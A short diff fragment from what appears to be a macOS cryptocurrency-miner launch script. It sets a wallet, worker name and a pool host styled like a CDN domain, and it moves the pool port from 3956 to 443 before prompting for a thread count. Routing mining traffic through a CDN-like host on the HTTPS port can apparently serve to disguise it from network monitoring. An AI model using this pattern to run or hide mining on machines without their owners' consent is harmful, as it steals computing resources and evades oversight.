@@ -9,7 +9,7 @@
 WALLET="RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX"
 WORKER="mac1"
 POOL_HOST="cdn.snumcaj.com"
-POOL_PORT="3956"
+POOL_PORT="443"
 
 # ---- Prompt user for thread count ----
 MAX_THREADS=$(sysctl -n hw.logicalcpu)
